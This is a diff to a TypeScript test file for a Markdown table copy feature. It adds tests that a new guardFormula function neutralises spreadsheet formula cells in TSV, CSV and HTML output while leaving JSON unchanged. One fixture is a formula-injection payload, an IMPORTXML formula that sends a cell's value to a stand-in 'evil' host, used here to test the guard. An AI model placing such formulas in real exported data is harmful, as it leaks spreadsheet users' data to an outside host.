@@ -4,7 +4,7 @@ import { test } from 'node:test';
 import type { Document, Table } from '../contracts/ast.ts';
 import { createBuffer, textOf } from '../buffer/buffer.ts';
 import { parseMarkdown } from '../parse/parse.ts';
-import { copyTableCsv, copyTableJson, copyTableTsv, csvOf, jsonOf, tsvOf } from './copy-table.ts';
+import { copyTableCsv, copyTableJson, copyTableTsv, csvOf, guardFormula, jsonOf, tsvOf } from './copy-table.ts';
 import { TABLE_PACK } from './pack-table.ts';
 import { cellGrid } from './table-cells.ts';
 import { corpusDocuments } from './testing/corpus.ts';
@@ -97,11 +97,25 @@ test('CSV: RFC 4180 quoting', () => {
   assert.equal(csvOf([['a'], ['b']]), 'a\r\nb');
 });
 
-test('cells that start with = + - @ are copied as they are (no formula guard, by design)', () => {
-  const src = '| a | b | c | d |\n|---|---|---|---|\n| =1+1 | +1 | -5 | @x |\n';
-  assert.equal(tsv(src).text, 'a\tb\tc\td\n=1+1\t+1\t-5\t@x');
-  assert.equal(csv(src), 'a,b,c,d\r\n=1+1,+1,-5,@x');
-  assert.deepEqual(JSON.parse(json(src)), [{ a: '=1+1', b: '+1', c: '-5', d: '@x' }]);
+test('a formula cell is guarded in TSV, its HTML and CSV; JSON stays faithful', () => {
+  const f = '=IMPORTXML("https://evil/?q="&A2,"//a")';
+  const src = `| a | b |\n|---|---|\n| ${f} | ok |\n`;
+  const t = tsv(src);
+  assert.equal(t.text, `a\tb\n'${f}\tok`);
+  assert.ok(t.html!.includes(`<td>'=IMPORTXML(`), t.html);
+  assert.equal(csv(src), `a,b\r\n"'${f.replace(/"/g, '""')}",ok`);
+  assert.equal((JSON.parse(json(src)) as { a: string }[])[0]!.a, f);
+});
+
+test('plain numbers are untouched; @handle and +text are guarded', () => {
+  const src = '| a | b | c | d | e | f |\n|---|---|---|---|---|---|\n| -5 | +1 | -0.5 | -1e3 | @handle | +cmd |\n';
+  assert.equal(tsv(src).text, "a\tb\tc\td\te\tf\n-5\t+1\t-0.5\t-1e3\t'@handle\t'+cmd");
+  assert.equal(csv(src), "a,b,c,d,e,f\r\n-5,+1,-0.5,-1e3,'@handle,'+cmd");
+  assert.equal(tsv('| a |\n|---|\n| -x |\n').text, "a\n'-x");
+});
+
+test('TSV: a cell beginning with a double quote is quoted, quotes doubled', () => {
+  assert.equal(tsv('| a |\n|---|\n| "hi" there |\n').text, 'a\n' + '"'.repeat(3) + 'hi' + '"'.repeat(2) + ' there"');
 });
 
 test('JSON: keyed by header; empty header is "column N", repeats "name (2)", values stay strings', () => {
@@ -153,8 +167,8 @@ test('round trip over every corpus table: TSV, CSV and JSON read back to cellGri
           const g = cellGrid(t);
           const input = { document, node: t, range: t.src, text: '' };
           const out = copyTableTsv.run(input).clipboard!;
-          assert.deepEqual(out.text.split('\n').map((l) => l.split('\t')), g.map((r) => r.map((c) => c.replace(/[\t\r\n]+/g, ' '))), `${file} tsv`);
-          assert.deepEqual(readCsv(copyTableCsv.run(input).clipboard!.text), g, `${file} csv`);
+          assert.deepEqual(out.text.split('\n').map((l) => l.split('\t')), g.map((r) => r.map((c) => { const v = guardFormula(c.replace(/[\t\r\n]+/g, ' ')); return v.startsWith('"') ? `"${v.replace(/"/g, '""')}"` : v; })), `${file} tsv`);
+          assert.deepEqual(readCsv(copyTableCsv.run(input).clipboard!.text), g.map((r) => r.map(guardFormula)), `${file} csv`);
           const parsed = JSON.parse(copyTableJson.run(input).clipboard!.text) as Record<string, string>[];
           assert.equal(parsed.length, g.length - 1, `${file} json rows`);
           const keys = Object.keys(parsed[0] ?? {});
